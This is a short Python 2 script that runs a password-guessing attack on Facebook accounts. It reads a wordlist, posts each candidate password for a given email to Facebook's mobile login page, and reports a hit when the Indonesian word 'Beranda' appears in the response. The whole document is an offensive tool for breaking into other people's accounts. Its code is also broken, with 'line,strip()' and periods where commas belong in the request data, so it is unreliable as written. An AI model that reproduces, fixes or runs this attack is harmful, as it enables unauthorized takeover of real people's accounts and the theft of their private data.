import requests
import sys

email = raw_input("email_> ")

url='https://free.facebook.com/login.php'
ex = open('word.txt', 'r').readlines()

for line in ex:
    password = line,strip()
    http = requests.post(url, data={'email':email. 'pass':password. 'login':'submit'})
    content = http.content
    if "Beranda" in content:
        print "[+] Password Found ",password
        sys.exit(1)
    else:
        print "[!] Password Invalid ",password
